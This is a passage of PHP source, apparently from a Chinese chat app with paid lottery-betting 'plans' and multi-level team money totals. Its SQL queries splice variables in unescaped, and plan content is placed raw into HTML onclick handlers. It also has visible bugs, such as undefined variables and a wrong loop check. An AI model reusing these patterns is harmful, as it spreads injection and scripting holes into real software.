function chat_messages_list1($group_id, $userid = "", $totime, $isgroup = 1)
{
    global $db, $system;

    $fromtime = time() - 7 * 24 * 3600;
    if ($isgroup == 1) {
        $group = GroupInfo($group_id, $userid);

        $is_owner = $group["is_owner"];
        if ($userid == "") {
            $userid = $_SESSION["userid"];
        }
        $t = time();
        $userlist = group_users1($group["id"]);
        // echo time()-$t;
        $msglist = [];
        $timeshow = $timeshow1 = 0;
        if ($is_owner == 1) {
        } else {
            foreach ($userlist as $v) {
                if ($v["id"] == $userid) {
                    if ($v["jointime"] > $fromtime) {
                        $fromtime = $v["jointime"];
                    }
                    break;
                }
            }
        }
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='{$group_id}' and isback='0' and addtime>='{$fromtime}' and addtime<='{$totime}' and (tip_uid='' or tip_uid='{$userid}')   and del_uids not like '%@{$userid}@%'  and content not like '%blob%' order by addtime desc ";
    } else {
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='0' and isback='0' and addtime>='{$fromtime}' and addtime<='{$totime}' and (tip_uid='' or tip_uid='{$userid}')    and ((userid='{$group_id}' and touid='{$userid}') or (touid='{$group_id}' and userid='{$userid}') )   and content not like '%blob%' and del_uids not like '%@{$userid}@%' order by addtime desc ";
    }
    $sql .= " limit 0,30 ";

    $list = $db->fetch_all($sql);

    if (count($list) > 0) {
        for ($i = count($list) - 1; $i >= 0; $i--) {
            $item = $list[$i];

            if (
                $item["type"] != "tips" &&
                ($item["addtime"] - $timeshow >= 300 ||
                    $item["addtime"] - $timeshow1 >= 900)
            ) {
                $msglist[] = [
                    "type" => "time",
                    "content" => timestamp($item["addtime"]),
                    "id" => $item["addtime"],
                ];
                $timeshow = $item["addtime"];
            }
            $timeshow1 = $item["addtime"];

            if ($item["userid"] == 0) {
                $sender = [
                    "id" => $item["userid"],
                    "nickname" => $system["nickname"],
                    "avatar" => $system["admin_logo"],
                ];
            } elseif ($item["userid"] == 1) {
                $sender = [
                    "id" => $item["userid"],
                    "nickname" => "验证消息",
                    "avatar" => "static/images/noteico.png",
                ];
            } else {
                if ($isgroup == 1) {
                    $user = group_userinfo($userlist, $item["userid"]);
                } else {
                    $user = userinfo($item["userid"]);
                }
                $sender = [
                    "id" => $item["userid"],
                    "nickname" => $user["nickname"],
                    "avatar" => $user["avatar"],
                    "usertype" => $user["usertype"],
                    "isvip" => $user["isvip"],
                ];
            }
            $item["sender"] = $sender;
            if ($item["userid"] == $userid) {
                $item["self"] = 1;
            } else {
                $item["self"] = 0;
            }

            if ($item["type"] == "vedio" || $item["type"] == "voice") {
                $item["content1"] = json_decode($item["content"]);
            } else {
                $item["content1"] = $item["content"];
            }
            if ($item["type"] == "redpacket") {
                $item["content1"] = ArrToJson(msg_content($item, $userid));
            }
            $item["content"] = msg_content($item, $userid);

            $item["time"] = date("Y-m-d H:i:s", $item["addtime"]);

            foreach ($item as $k1 => $v1) {
                if (($k1 > 0 && $k1 < 100) || $k1 === 0) {
                    unset($item[$k1]);
                }
            }

            $msglist[] = $item;
        }
    }

    return $msglist;
}

function chat_messages_list($group_id, $userid = "", $totime, $isgroup = 1)
{
    global $db, $system;
    $fromtime = time() - 7 * 24 * 3600;
    if ($isgroup == 1) {
        $group = GroupInfo($group_id);
        $is_owner = $group["is_owner"];
        if ($userid == "") {
            $userid = $_SESSION["userid"];
        }
        $userlist = group_users1($group["id"]);
        $msglist = [];
        $timeshow = $timeshow1 = 0;
        if ($is_owner == 1) {
        } else {
            foreach ($userlist as $v) {
                if ($v["id"] == $userid) {
                    if ($v["jointime"] > $fromtime) {
                        $fromtime = $v["jointime"];
                    }
                    break;
                }
            }
        }
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='{$group_id}' and isback='0' and addtime>='{$fromtime}' and addtime<='{$totime}' and (tip_uid='' or tip_uid='{$userid}')   and del_uids not like '%@{$userid}@%'  and content not like '%blob%' order by addtime desc ";
    } else {
        $sql =
            "select * from " .
            tname("chat") .
            " where groupid='0' and isback='0' and addtime>='{$fromtime}' and addtime<='{$totime}' and (tip_uid='' or tip_uid='{$userid}')    and ((userid='{$group_id}' and touid='{$userid}') or (touid='{$group_id}' and userid='{$userid}') )   and content not like '%blob%' and del_uids not like '%@{$userid}@%' order by addtime desc ";
    }
    $sql .= " limit 0,30 ";

    $list = $db->fetch_all($sql);
    if (count($list) > 0) {
        for ($i = count($list) - 1; $i >= 0; $i--) {
            $item = $list[$i];

            if (
                $item["type"] != "tips" &&
                ($item["addtime"] - $timeshow >= 300 ||
                    $item["addtime"] - $timeshow1 >= 900)
            ) {
                $msglist[] = [
                    "type" => "time",
                    "content" => timestamp($item["addtime"]),
                    "id" => $item["addtime"],
                ];
                $timeshow = $item["addtime"];
            }
            $timeshow1 = $item["addtime"];

            if ($item["userid"] == 0) {
                $sender = [
                    "id" => $item["userid"],
                    "nickname" => $system["nickname"],
                    "avatar" => $system["admin_logo"],
                ];
            } elseif ($item["userid"] == 1) {
                $sender = [
                    "id" => $item["userid"],
                    "nickname" => "验证消息",
                    "avatar" => "static/images/noteico.png",
                ];
            } else {
                if ($isgroup == 1) {
                    $user = group_userinfo($userlist, $item["userid"]);
                } else {
                    $user = userinfo($item["userid"]);
                }
                $sender = [
                    "id" => $item["userid"],
                    "nickname" => $user["nickname"],
                    "avatar" => $user["avatar"],
                    "usertype" => $user["usertype"],
                    "isvip" => $user["isvip"],
                ];
            }
            $item["sender"] = $sender;
            if ($item["userid"] == $userid) {
                $item["self"] = 1;
            } else {
                $item["self"] = 0;
            }

            if ($item["type"] == "vedio" || $item["type"] == "voice") {
                $item["content1"] = json_decode($item["content"]);
            } else {
                $item["content1"] = $item["content"];
            }
            if ($item["type"] == "redpacket") {
                $item["content1"] = ArrToJson(msg_content($item, $userid));
            }
            $item["content"] = msg_content($item, $userid);

            $item["time"] = date("Y-m-d H:i:s", $item["addtime"]);

            foreach ($item as $k1 => $v1) {
                if (($k1 > 0 && $k1 < 100) || $k1 === 0) {
                    unset($item[$k1]);
                }
            }

            $msglist[] = $item;
        }
    }

    return $msglist;
}

function userinfo($id, $userid = "")
{
    global $db, $system;

    if ($userid == "") {
        $userid = $_SESSION["userid"];
    }
    $user = $db->exec("select * from " . tname("user") . " where id='{$id}'");

    $user["avatar"] = app_avatar($user["avatar"]);
    if (!$user["nickname"]) {
        $user["nickname"] = $user["name"];
        $user["issetname"] = 0;
    } else {
        $user["issetname"] = 1;
    }
    if (!$user["number"]) {
        $user["number"] = $user["id"];
    }
    if (time() - $user["online"] > $system["online_time"]) {
        $user["isonline"] = 0;
    } else {
        $user["isonline"] = 1;
    }
    $user["money"] = number_format($user["money"], 2, ".", "");
    $user["showname"] = $user["nickname"];
    $user["from"] = "";

    if ($userid > 0) {
        $row = $db->exec(
            "select * from " .
                tname("friend") .
                " where userid='{$userid}' and friendid='{$id}'"
        );

        if ($row["id"] > 0) {
            $isfriend = 1;

            if ($row["mark"]) {
                $user["nickname"] = $row["mark"];
            }

            $user["from"] = friend_addmethod($row["from"]);
        } else {
            $isfriend = 0;
        }
    } else {
        $isfriend = 0;
    }
    $user["isfriend"] = $isfriend;
    $bank = $db->exec(
        "select count(*) as num from " . tname("bank") . " where uid='{$id}'"
    );
    $user["banknum"] = $bank["num"];
    $logout_words = unserialize($user["logout_words"]);
    if (count($logout_words) > 0) {
        $user["logout_words"] = $logout_words;
    } else {
        $user["logout_words"] = [];
    }
    if ($user["vip"] > 0) {
        $user["isvip"] = 1;
        if ($user["vip"] == 3) {
            $user["usertype"] = 3;
        } else {
            $user["usertype"] = 2;
        }
    } else {
        if ($user["isdaili"] == 1) {
            $user["usertype"] = 1;
        } else {
            $user["usertype"] = 0;
        }
        $user["isvip"] = 0;
    }
    if ($user["vip_time"] > time()) {
        $lasttime = ceil(($user["vip_time"] - time()) / 86400);
    } else {
        $lasttime = 0;
    }
    $user["vip_lasttime"] = $lasttime;
    $data = $user;

    return $data;
}

function get_nextids($pid)
{
    global $db;
    $res = [];
    $list = $db->fetch_all("select id from app_user where `pid` = '{$pid}'");
    if (count($list) > 0) {
        foreach ($list as $value) {
            $res[] = $value["id"];
        }
    }
    return $res;
}

function get_teamids($userid)
{
    global $db;

    $pids = get_nextids($userid);

    for ($i = 0; $i < 3; $i++) {
        if (count($pids) > 0) {
            foreach ($pids as $value) {
                $arr = get_nextids($value);
                if (count($arr) > 0) {
                    foreach ($arr as $v1) {
                        if (!in_array($i, $pids)) {
                            $pids[] = $v1;
                        }
                    }
                }
            }
        }
    }

    return $pids;
}

function get_teammoney($uid)
{
    global $db;
    $pids = get_teamids($uid);
    if (!in_array($uid, $pids)) {
        $pids[] = $uid;
    }
    $str = implode(",", $pids);
    $row = $db->exec(
        "select sum(money) as money from " .
            tname("user") .
            " where id in ({$str})"
    );
    return number_format($row["money"], 2, ".", "");
}

function get_istop($userid, $cache_key)
{
    global $db;
    $row = $db->exec(
        "select * from " .
            tname("msgtop") .
            " where userid='{$userid}' and cache_key='{$cache_key}'"
    );
    if ($row["id"]) {
        return true;
    } else {
        return false;
    }
}
function get_isnotip($userid, $cache_key)
{
    global $db;
    $row = $db->exec(
        "select * from " .
            tname("msgnotip") .
            " where userid='{$userid}' and cache_key='{$cache_key}'"
    );
    if ($row["id"]) {
        return true;
    } else {
        return false;
    }
}
function getfirstchar($s0)
{
    $fchar = ord($s0[0]);
    if ($fchar >= ord("A") and $fchar <= ord("z")) {
        return strtoupper($s0[0]);
    }
    //$s1 = iconv("UTF-8","gb2312//IGNORE", $s0);
    // $s2 = iconv("gb2312","UTF-8//IGNORE", $s1);
    $s1 = get_encoding($s0, "GB2312");
    $s2 = get_encoding($s1, "UTF-8");
    if ($s2 == $s0) {
        $s = $s1;
    } else {
        $s = $s0;
    }
    $asc = ord($s[0]) * 256 + ord($s[1]) - 65536;
    if ($asc >= -20319 and $asc <= -20284) {
        return "A";
    }
    if ($asc >= -20283 and $asc <= -19776) {
        return "B";
    }
    if ($asc >= -19775 and $asc <= -19219) {
        return "C";
    }
    if ($asc >= -19218 and $asc <= -18711) {
        return "D";
    }
    if ($asc >= -18710 and $asc <= -18527) {
        return "E";
    }
    if ($asc >= -18526 and $asc <= -18240) {
        return "F";
    }
    if ($asc >= -18239 and $asc <= -17923) {
        return "G";
    }
    if ($asc >= -17922 and $asc <= -17418) {
        return "I";
    }
    if ($asc >= -17417 and $asc <= -16475) {
        return "J";
    }
    if ($asc >= -16474 and $asc <= -16213) {
        return "K";
    }
    if ($asc >= -16212 and $asc <= -15641) {
        return "L";
    }
    if ($asc >= -15640 and $asc <= -15166) {
        return "M";
    }
    if ($asc >= -15165 and $asc <= -14923) {
        return "N";
    }
    if ($asc >= -14922 and $asc <= -14915) {
        return "O";
    }
    if ($asc >= -14914 and $asc <= -14631) {
        return "P";
    }
    if ($asc >= -14630 and $asc <= -14150) {
        return "Q";
    }
    if ($asc >= -14149 and $asc <= -14091) {
        return "R";
    }
    if ($asc >= -14090 and $asc <= -13319) {
        return "S";
    }
    if ($asc >= -13318 and $asc <= -12839) {
        return "T";
    }
    if ($asc >= -12838 and $asc <= -12557) {
        return "W";
    }
    if ($asc >= -12556 and $asc <= -11848) {
        return "X";
    }
    if ($asc >= -11847 and $asc <= -11056) {
        return "Y";
    }
    if ($asc >= -11055 and $asc <= -10247) {
        return "Z";
    }
    return null;
}
/**
 * @name: get_encoding
 * @description: 自动检测内容编码进行转换
 * @param: string data
 * @param: string to  目标编码
 * @return: string
 **/
function get_encoding($data, $to)
{
    $encode_arr = [
        "UTF-8",
        "ASCII",
        "GBK",
        "GB2312",
        "BIG5",
        "JIS",
        "eucjp-win",
        "sjis-win",
        "EUC-JP",
    ];
    $encoded = mb_detect_encoding($data, $encode_arr);
    $data = mb_convert_encoding($data, $to, $encoded);
    return $data;
}

function pinyin1($zh)
{
    try {
        $ret = "";
        $s1 = iconv("UTF-8", "gb2312", $zh);
        $s2 = iconv("gb2312", "UTF-8", $s1);

        if ($s2 == $zh) {
            $zh = $s1;
        }

        for ($i = 0; $i < strlen($zh); $i++) {
            $s1 = substr($zh, $i, 1);
            $p = ord($s1);
            if ($p > 160) {
                $s2 = substr($zh, $i, 3);
                return strtoupper(getfirstchar($s2));
            } else {
                return strtoupper($s1);
            }
        }
        return strtoupper($ret);
    } catch (Exception $e) {
        return "*";
    }
}

//获取所有用户
function getAllUsers($userid, $tagId, $page, $pageSize)
{
    global $db, $HttpPath, $system;
    $logintime = time() - $system["online_time"];
    $list = $db->fetch_all(
        "select * from " .
            tname("user") .
            " where id!='{$userid}'  and tag_id='{$tagId}' order by online desc"
    );
    $data = [];
    $res = [];
    $res["code"] = 200;
    if (count($list) > 0) {
        foreach ($list as $value) {
            // $value['id']=$value['userid'];
            // $user=userinfo($value['friendid']);
            if (time() - $value["online"] > $system["online_time"]) {
                $value["isonline"] = 0;
            } else {
                $value["isonline"] = 1;
            }

            if (strpos($value["avatar"], "http") !== false) {
            } else {
                $value["avatar"] = $HttpPath . $value["avatar"];
            }
            if ($value["mark"] and $value["mark"] != null) {
                $value["nickname"] = $value["mark"];
            }

            $value["pinyin"] = pinyin1($value["nickname"]);

            if ($value["id"] == $system["admin_id"]) {
                $value["iskefu"] = 2;
            } else {
                // if($parent['pid']==$user['id']) $user['iskefu']=3;
            }

            $data[] = [
                "id" => $value["id"],
                "nickname" => $value["nickname"],
                "avatar" => $value["avatar"],
                "iskefu" => $value["iskefu"],
                "pinyin" => $value["pinyin"],
                "yearVip" => $value["vip"],
                "timeVip" => $value["vip_time"],
                "province" => $value["province"],
                "city" => $value["city"],
                "sign" => $value["sign"],
                "sex" => $value["sex"],
                "love" => $value["love"],
                "tag_id" => $value["tag_id"],
                "is_online" => $value["isonline"],
            ];
        }
    }
    return $data;
}

//获取不同类型用户
function getAllUsersByType($type, $page, $pageSize)
{
    global $db, $HttpPath, $system;
    $start = ($page - 1) * $pageSize;

    if ($type == "online") {
        $logintime = time() - $system["online_time"];
        $list = $db->fetch_all(
            "select * from " .
                tname("user") .
                " where  `online`>='{$logintime}' order by id desc limit $start,$pageSize"
        );
    } else {
        $list = $db->fetch_all(
            "select * from " .
                tname("user") .
                "  order by id desc limit $start,$pageSize"
        );
    }

    $data = [];
    $res = [];
    $res["code"] = 200;
    if (count($list) > 0) {
        foreach ($list as $value) {
            // $value['id']=$value['userid'];
            // $user=userinfo($value['friendid']);

            if (strpos($value["avatar"], "http") !== false) {
            } else {
                $value["avatar"] = $HttpPath . $value["avatar"];
            }
            if ($value["mark"] and $value["mark"] != null) {
                $value["nickname"] = $value["mark"];
            }

            $value["pinyin"] = pinyin1($value["nickname"]);

            if ($value["id"] == $system["admin_id"]) {
                $value["iskefu"] = 2;
            } else {
                // if($parent['pid']==$user['id']) $user['iskefu']=3;
            }

            $data[] = [
                "id" => $value["id"],
                "nickname" => $value["nickname"],
                "avatar" => $value["avatar"],
                "iskefu" => $value["iskefu"],
                "pinyin" => $value["pinyin"],
                "yearVip" => $value["vip"],
                "timeVip" => $value["vip_time"],
                "province" => $value["province"],
                "city" => $value["city"],
                "sign" => $value["sign"],
                "sex" => $value["sex"],
                "love" => $value["love"],
            ];
        }
    }
    return $data;
}

function getMyFriend($userid)
{
    global $db, $HttpPath, $system;

    $list = $db->fetch_all(
        "select t1.id,t1.userid,t1.friendid,t1.status,t1.time,t1.from,t1.istop,t1.no_tip,t2.id as uid,t2.avatar,t2.name,t2.nickname,t2.iskefu,t2.vip,t2.vip_time,t2.tag_id,t1.mark from " .
            tname("friend") .
            " as t1 join " .
            tname("user") .
            " as t2 on t1.friendid=t2.id where t1.userid='{$userid}' order by null"
    );

    $parent = userinfo($userid);
    $data = [];
    $res = [];
    $res["code"] = 200;
    if (count($list) > 0) {
        foreach ($list as $value) {
            $value["id"] = $value["userid"];
            // $user=userinfo($value['friendid']);

            if (strpos($user["avatar"], "http") !== false) {
            } else {
                $value["avatar"] = $HttpPath . $value["avatar"];
            }

            if ($value["mark"] and $value["mark"] != null) {
                $value["nickname"] = $value["mark"];
            }

            $value["pinyin"] = pinyin1($value["nickname"]);
            if (is_numeric($value["pinyin"])) {
                $value["pinyin"] = "#";
            }
            if (empty($value["pinyin"]) || $value["pinyin"] == "") {
                $value["pinyin"] = "#";
            }
            if ($value["uid"] == $system["admin_id"]) {
                $value["iskefu"] = 2;
            } else {
                if ($parent["pid"] == $value["uid"]) {
                    $value["iskefu"] = 3;
                }
            }

            $data[] = [
                "id" => $value["uid"],
                "nickname" => $value["nickname"] ? $value["nickname"] : $value["name"],
                "avatar" => $value["avatar"],
                "iskefu" => $value["iskefu"],
                "pinyin" => $value["pinyin"],
                "yearVip" => $value["vip"],
                "timeVip" => $value["vip_time"],
                "tag_id" => $user["tag_id"],
            ];
        }
    }
    //$data=sysSortArray($data,'pinyin');
    // print_r($data);
    return $data;
}
function plan_info($id)
{
    global $db, $wanfa_arr, $wanfa_arr1;
    $item = $db->exec("select * from " . tname("plan") . " where id='{$id}'");
    $game = $db->exec(
        "select * from " . tname("game") . " where showkey='{$item["gamekey"]}'"
    );
    $user = userinfo($item["userid"]);
    if ($user["plan_title"]) {
        $item["title"] = $user["plan_title"];
    } else {
        $item["title"] = $user["nickname"];
    }
    $item["vip"] = $user["vip"];
    $item["plan_sign"] = $user["plan_sign"];

    if (strpos($item["title"], "计划") === false) {
        $item["title"] .= "计划";
    }
    $item["wanfa"] =
        $wanfa_arr[$game["type"]][$item["wf1"]] .
        $wanfa_arr1[$game["type"]][$item["wf1"]][$item["wf2"]];
    $item["isonline"] = $user["isonline"];

    return $item;
}

function plan_detail($id, $type = "detail", $userid = "", $from = "")
{
    global $db, $wanfa_arr, $wanfa_arr1;
    if ($userid == "") {
        $userid = $_SESSION["userid"];
    }
    $item = plan_info($id);

    $game = $db->exec(
        "select * from " . tname("game") . " where showkey='{$item["gamekey"]}'"
    );
    $lines = json_decode($item["lines"], true);
    $method = $item["method"];
    if ($item["isonline"] == 1) {
        $list1 = "计划员可能在更新中，稍后刷新下";
    } else {
        $list1 = "计划员已下线，一会再来看看";
    }

    $buyinfo = "quit";
    $list2 = $doing = [];
    if ($item["status"] == 1) {
        if ($item["money"] > 0 && $_SESSION["userid"] != $item["userid"]) {
            $isbuy = 1;
            $tt = $db->exec(
                "select * from " .
                    tname("plan_buy") .
                    " where plan_id='{$item["id"]}' and expect='{$exp}' and userid='{$_SESSION["userid"]}'"
            );
            if ($tt["id"] > 0) {
                $isbuy = 0;
            } else {
                $tt = $db->exec(
                    "select count(*) as num from " .
                        tname("plan_buy") .
                        " where plan_id='{$item["id"]}' and expect='{$exp}' "
                );
                $str = "支付{$item["money"]}元查看,已有{$tt["num"]}人支付 <span class='btn' onclick=\"plan_buy('{$item["id"]}');\">支付</span>";
                $value["content"] = $str;
            }
        } else {
            $isbuy = 0;
            $value = json_decode($item["doing"], true);
            $str = plan_item($item, $value, $game, 1);
        }

        $list1 = $str;
        $buyinfo = $value["content"];
        if (isMobile() && $item["wf2"] == "ds") {
            $value = json_decode($item["doing"], true);
            $str1 = "<span onclick=\"show_ds_detail('{$value["content"]}')\">查看</span>";
            $str1 .= "<span  onclick=\"copy('{$value["content"]}');\">复制</span>";
            $item["title_btn"] = $str1;
            $item["copy"] = $value["content"];
        }
    }
    $item["buyinfo"] = $buyinfo;
    $item["list1"] = $list1;
    //     $game_time=$db->exec("select max(num) as num from ".tname('game_time')." where gamekey='{$item['gamekey']}'");
    //     $max_period=$game_time['num'];
    $last_expect = "";

    $losenum = 0;
    if ($type != "list") {
        if (count($lines) > 0) {
            for ($i = 0; $i < count($lines); $i++) {
                $value = $lines[$i];
                $str = plan_item($item, $value, $game, 2);

                $expects = explode(",", $value["expects"]);
                $expects = explode("-", $expects[0]);

                if ($expects[1] - $last_expect > 1 && $last_expect > 0) {
                    $losenum++;
                    $len = strlen($expects[1]);
                    $a = sprintf("%0{$len}d", $last_expect + 1);
                    $b = sprintf("%0{$len}d", $expects[1] - 1);
                    $c = $b - $a + 1;

                    $temp = "<div class='message'>{$a}-{$b} 计划员中场休息  出现了第{$losenum}次断期  共{$c}期</div>";
                    $list2[] = $temp;
                }
                $expect = explode("-", $value["expect"]);
                $last_expect = $expect[1];
                $list2[] = $str;
            }
        }

        $list2 = array_reverse($list2);
        if (count($list2) < 1 && $item["status"] == 2) {
            $list2[] =
                "<div style='color: #fff;font-weight:600;font-size:20px;margin-top: 20px;'>该计划今日暂未更新！</div>";
        }
        $item["list2"] = $list2;
    }

    $item["isbuy"] = $isbuy;
    $item["lostnum"] = $losenum;
    if ($item["wf1"] == "dwd") {
        $numshow = "码";
    } else {
        $numshow = "注";
    }
    $item["numshow"] = $numshow;
    $item["showtitle"] =
        $item["title"] . " " . $item["wanfa"] . " " . $item["num"] . $numshow;
    $item["showtitle1"] =
        $item["title"] .
        " " .
        $item["wanfa"] .
        " " .
        $item["num"] .
        $numshow .
        "(" .
        $game["title"] .
        ")";
    $item["othertitle"] =
        $game["title"] .
        " " .
        $item["wanfa"] .
        " " .
        $item["num"] .
        $numshow .
        "(" .
        $item["title"] .
        ")";
    $item["othertitle1"] =
        $game["title"] . " " . $item["wanfa"] . " " . $item["num"] . $numshow;
    unset($item["content"]);
    unset($item["lines"]);
    $isuseraction = $isaction = 0;
    if ($userid > 0) {
        $row = $db->exec(
            "select * from " .
                tname("plan_action") .
                " where plan_id='{$item["id"]}' and uid='{$userid}'"
        );
        if ($row["id"] > 0) {
            $isaction = 1;
        }
        $row = $db->exec(
            "select * from " .
                tname("user_action") .
                " where userid='{$userid}' and touid='{$item["userid"]}'"
        );
        if ($row["id"] > 0) {
            $isuseraction = 1;
        }
    }
    $item["isaction"] = $isaction;
    $item["isuseraction"] = $isuseraction;

    foreach ($item as $key => $value) {
        if (is_numeric($key)) {
            unset($item[$key]);
        }
    }
    return $item;
}

function plan_item($item, $value, $game, $status)
{
    $str = "";
    global $wanfa_arr, $wanfa_arr1;

    if ($item["method"] != 3) {
        if ($status == 1) {
            $expects = explode(",", $item["expects"]);
        } else {
            $expects = explode(",", $value["expects"]);
        }
        $arr1 = explode("-", $expects[0]);
        $min = $arr1[1];
        $max = $min + $value["expect_num"] - 1;
        $len = strlen($min);
        $max = sprintf("%0{$len}d", $max);
        $str = $min . "-" . $max;
    } else {
        if ($status == 1) {
            $expects = explode(",", $item["expects"]);
        } else {
            $expects = explode(",", $value["expects"]);
        }
        $str = $expects[1];
    }

    $wanfa =
        $wanfa_arr[$game["type"]][$value["wf1"]] .
        $wanfa_arr1[$game["type"]][$value["wf1"]][$value["wf2"]];
    $str .= " " . $wanfa;
    if ($value["wf1"] == "dwd") {
        $str .= "【{$value["content"]}】";
        $str .= " " . $value["num"] . "码";
    } elseif ($value["wf2"] != "ds") {
        $str .= "【{$value["content"]}】";
        $str .= " " . $value["num"] . "注";
    } else {
        if (is_array($value["num"])) {
            $str .= " " . $value["num"][0] . "注";
        } else {
            $str .= " " . $value["num"] . "注";
        }
    }

    if ($status == 1) {
        $expect = explode("-", $item["expect"]);
    } else {
        $expect = explode("-", $value["expect"]);
    }
    $str .= " " . $expect[1] . "期";

    if ($status == 1) {
        $str .= " 进行中[{$item["donum"]}]";
    } else {
        if ($game["type"] == "11x5") {
            $str .=
                " <span style='color:#ff6a00'>" .
                str_replace(",", " ", $value["number"]) .
                "</span>";
        }
        //  $str=$value['numbber']
        else {
            $str .= " " . str_replace(",", "", $value["number"]);
        }
        if ($value["result"] == 1) {
            $str .= " <span style='color: #ff0000'>中</span>";
        } else {
            $str .= " <span style='color: green;'>挂</span>";
        }
    }
    $str = "<p>{$str}</p>";
    if ($value["wf2"] == "ds" && $status == 1 && !isMobile()) {
        $str .= "<span class='btn' style='right:40px;' onclick=\"show_ds_detail('{$value["content"]}')\">查看</span>";
        $str .= "<span class='btn' onclick=\"copy('{$value["content"]}');\">复制</span>";
        $str .= "<span class='ds_html' style='display: none'>{$value["content"]}</span>";
    }
    return $str;
}

function array_to_object($arr)
{
    if (gettype($arr) != "array") {
        return;
    }
    foreach ($arr as $k => $v) {
        if (gettype($v) == "array" || getType($v) == "object") {
            $arr[$k] = (object) array_to_object($v);
        }
    }

    return (object) $arr;
}

/**
 * 对象 转 数组
 *
 * @param object $obj 对象
 * @return array
 */
function object_to_array($obj)
{
    $obj = (array) $obj;
    foreach ($obj as $k => $v) {
        if (gettype($v) == "resource") {
            return;
        }
        if (gettype($v) == "object" || gettype($v) == "array") {
            $obj[$k] = (array) object_to_array($v);
        }
    }

    return $obj;
}
function is_friend($userid, $friendid)
{
    global $db;
    $row1 = $db->query(
        "select * from " .
            tname("friend") .
            " where userid='{$userid}' and friendid='{$friendid}'"
    );
    $row2 = $db->query(
        "select * from " .
            tname("friend") .
            " where userid='{$friendid}' and friendid='{$userid}'"
    );
    if ($row1["id"] > 0 and $row2["id"] > 0) {
        return true;
    } else {
        return false;
    }
}
function add_friend($userid, $friendid, $from = "")
{
    global $db;
    $now = time();
    $db->query(
        "delete from " .
            tname("friend") .
            " where userid='{$userid}' and friendid='{$friendid}'"
    );
    $db->query(
        "delete from " .
            tname("friend") .
            " where userid='{$friendid}' and friendid='{$userid}'"
    );
    $db->query(
        "insert into " .
            tname("friend") .
            " (userid,friendid,time,`from`) values('{$userid}','{$friendid}','{$now}','{$from}')"
    );
    $db->query(
        "insert into " .
            tname("friend") .
            " (friendid,userid,time,`from`) values('{$userid}','{$friendid}','{$now}','{$from}')"
    );
    return true;
}

function ispause($str)
{
    $temp = ",.? ，。？·；：;:!";
    if (strpos($temp, $str) != false) {
        return true;
    } else {
        return false;
    }
}

function filter_mark($text)
{
    if (trim($text) == "") {
        return "";
    }
    $text = preg_replace("/[[:punct:]\s]/", " ", $text);
    $text = urlencode($text);
    $text = preg_replace(
        "/(%7E|%60|%21|%40|%23|%24|%25|%5E|%26|%27|%2A|%28|%29|%2B|%7C|%5C|%3D|\-|_|%5B|%5D|%7D|%7B|%3B|%22|%3A|%3F|%3E|%3C|%2C|\.|%2F|%A3%BF|%A1%B7|%A1%B6|%A1%A2|%A1%A3|%A3%AC|%7D|%A1%B0|%A3%BA|%A3%BB|%A1%AE|%A1%AF|%A1%B1|%A3%FC|%A3%BD|%A1%AA|%A3%A9|%A3%A8|%A1%AD|%A3%A4|%A1%A4|%A3%A1|%E3%80%82|%EF%BC%81|%EF%BC%8C|%EF%BC%9B|%EF%BC%9F|%EF%BC%9A|%E3%80%81|%E2%80%A6%E2%80%A6|%E2%80%9D|%E2%80%9C|%E2%80%98|%E2%80%99|%EF%BD%9E|%EF%BC%8E|%EF%BC%88)+/",
        ",",
        $text
    );
    $text = urldecode($text);
    return trim($text);
}

function str_is_in_array($str, $arr)
{
    if (count($arr) > 0) {
        foreach ($arr as $value) {
            if (filter_mark($value) == filter_mark($str)) {
                return true;
            }
        }
        return false;
    } else {
        return false;
    }
}

function destory_voice()
{
    global $db;
    $time = time() - 24 * 3600 * 7;

    $time2 = strtotime(date("Y-m-d", time()) . " 00:00:00");
    $num = 0;
    $list = $db->fetch_all(
        "select * from " .
            tname("voice") .
            " where (`show`='0' or addtime<='{$time}') and addtime<'{$time2}'"
    );
    if (count($list) > 0) {
        foreach ($list as $value) {
            $uid = $value["uid"];
            $delete = 1;

            if ($value["me"] == 1 and strlen($value["content"]) >= 10) {
                if (
                    !$db->exec(
                        "select * from " .
                            tname("voice") .
                            " where uid='{$uid}' and content='{$value["content"]}'"
                    )
                ) {
                    $delete = 0;
                }
                if (
                    $db->exec(
                        "select * from " .
                            tname("words") .
                            " where title='{$value["content"]}'"
                    )
                ) {
                    $delete = 1;
                }
                if (
                    $db->exec(
                        "select * from " .
                            tname("fav") .
                            " where title='{$value["content"]}' and  (uid='0' or uid='{$uid}')"
                    )
                ) {
                    $delete = 1;
                }
            }
            if ($delete == 1) {
                voice_delete($value["id"]);
                $num++;
            }
        }
    }

    add_adminlog("删除了{$num}条无用语音数据");
    return $num;
}

/**
 * 获取客户端手机型号
 * @param $agent    //$_SERVER['HTTP_USER_AGENT']
 * @return array[mobile_brand]      手机品牌
 * @return array[mobile_ver]        手机型号
 */
function getClientMobileBrand()
{
    global $_SERVER;
    $agent = $_SERVER["HTTP_USER_AGENT"];

    if (preg_match("/iPhone\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "苹果";
        $mobile_ver = $regs[0];
    } elseif (
        preg_match("/SAMSUNG|Galaxy|GT-|SCH-|SM-\s([^\s|;]+)/i", $agent, $regs)
    ) {
        $mobile_brand = "三星";
        $mobile_ver = $regs[0];
    } elseif (
        preg_match("/Huawei|Honor|H60-|H30-\s([^\s|;]+)/i", $agent, $regs)
    ) {
        $mobile_brand = "华为";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/MI|mi|Mi \s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "小米";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/HM NOTE|HM201\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "红米";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/Coolpad|8190Q|5910\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "酷派";
        $mobile_ver = $regs[0];
    } elseif (
        preg_match("/ZTE|X9180|N9180|U9180\s([^\s|;]+)/i", $agent, $regs)
    ) {
        $mobile_brand = "中兴";
        $mobile_ver = $regs[0];
    } elseif (
        preg_match(
            "/OPPO|X9007|X907|X909|R831S|R827T|R821T|R811|R2017\s([^\s|;]+)/i",
            $agent,
            $regs
        )
    ) {
        $mobile_brand = "OPPO";
        $mobile_ver = $regs[0];
    } elseif (preg_match("/HTC|Desire\s([^\s|;]+)/i", $agent, $regs)) {
        $mobile_brand = "HTC";
        $mobile_ver = $regs[0];
